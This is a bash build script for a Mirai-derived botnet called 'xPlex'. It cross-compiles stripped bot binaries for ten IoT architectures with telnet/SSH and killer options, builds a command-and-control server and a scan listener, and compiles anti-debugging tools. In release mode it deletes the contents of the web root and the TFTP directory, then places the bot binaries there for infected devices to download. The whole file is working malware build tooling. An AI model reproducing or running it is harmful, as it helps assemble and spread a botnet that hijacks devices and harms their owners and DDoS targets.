#!/bin/bash

FLAGS=""

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

if [ $# == 2 ]; then
    if [ "$2" == "telnet" ]; then
        FLAGS="-DMIRAI_TELNET"
    elif [ "$2" == "ssh" ]; then
        FLAGS="-DMIRAI_SSH"
    fi
else
    echo "Missing build type." 
    echo "Usage: $0 <debug | release> <telnet | ssh>"
fi

if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release> <telnet | ssh>"
elif [ "$1" == "release" ]; then
    rm -rf release
	mkdir release
	rm -rf /var/www/html/*
	rm -rf /var/lib/tftpboot
	mkdir /var/lib/tftpboot
    mkdir /var/www/html/bins
    go build -o release/cnc cnc/*.go
	go build -o release/scanListen tools/scanListen.go
    compile_bot i586 xPlex.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot mips xPlex.mips "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot mipsel xPlex.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot armv4l xPlex.arm "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot armv5l xPlex.arm5n "$FLAGS -DKILLER_REBIND_SSH"
    compile_bot armv6l xPlex.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot powerpc xPlex.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot sparc xPlex.spc "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot m68k xPlex.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot sh4 xPlex.sh4 "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot i586 xPlexnt.x86 "-static"
    compile_bot mips xPlexnt.mips "-static"
    compile_bot mipsel xPlexnt.mpsl "-static"
    compile_bot armv4l xPlexnt.arm "-static"
    compile_bot armv5l xPlexnt.arm5n " "
    compile_bot armv6l xPlexnt.arm7 "-static"
    compile_bot powerpc xPlexnt.ppc "-static"
    compile_bot sparc xPlexnt.spc "-static"
    compile_bot m68k xPlexnt.m68k "-static"
    compile_bot sh4 xPlexnt.sh4 "-static"
	cp release/xPlex* /var/www/html/bins
	mv release/xPlex* /var/lib/tftpboot
	
elif [ "$1" == "debug" ]; then
    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/xPlex.dbg
    mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/xPlex.mips
    armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/xPlex.arm
    armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/xPlex.arm7
    sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/xPlex.sh4
    gcc -std=c99 tools/enc.c -g -o debug/enc
    gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
    gcc -std=c99 tools/badbot.c -g -o debug/badbot
    go build -o debug/cnc cnc/*.go
    go build -o debug/scanListen tools/scanListen.go
else
    echo "Unknown parameter $1: $0 <debug | release>"
fi
